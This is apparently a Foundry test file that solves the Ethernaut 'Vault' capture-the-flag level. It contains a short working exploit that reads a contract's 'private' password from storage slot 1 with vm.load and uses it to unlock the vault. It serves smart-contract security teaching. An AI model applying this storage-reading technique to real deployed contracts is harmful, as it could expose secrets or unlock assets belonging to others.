pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Vault/VaultFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract VaultTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // This level needs to load a private variable from a storage slot
        // Use vm.load()
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        ethernautVault.unlock(password);
        assertTrue(!(ethernautVault.locked()));
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}